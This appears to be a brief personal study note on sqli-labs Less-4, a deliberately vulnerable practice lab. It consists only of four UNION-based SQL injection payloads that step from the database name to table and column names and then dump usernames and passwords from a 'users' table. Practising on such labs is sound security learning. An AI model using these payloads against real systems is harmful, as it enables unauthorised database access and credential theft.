---
title: "sqlilabs-less04"
date: 2026-04-07
published: 2026-04-07
permalink: /posts/.trash/sqlilabs-less04/
author: Rin
categories:
  - 笔记
tags:
  - Study
  - Linux
---

### payload

-1") union select 1,database(),3--+

-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1") union select 1,group_concat(username),group_concat(password) from users--+